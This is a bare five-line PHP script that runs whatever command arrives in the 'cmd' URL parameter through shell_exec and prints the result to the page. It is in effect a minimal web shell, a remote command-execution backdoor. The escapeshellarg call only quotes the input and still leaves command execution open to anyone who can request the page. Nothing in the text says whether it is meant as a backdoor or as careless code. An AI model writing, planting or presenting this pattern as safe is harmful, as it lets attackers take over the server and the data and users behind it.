<?php
$cmd = escapeshellarg($_GET['cmd']); 
$output = shell_exec($cmd);
echo "<pre>$output</pre>";
?>
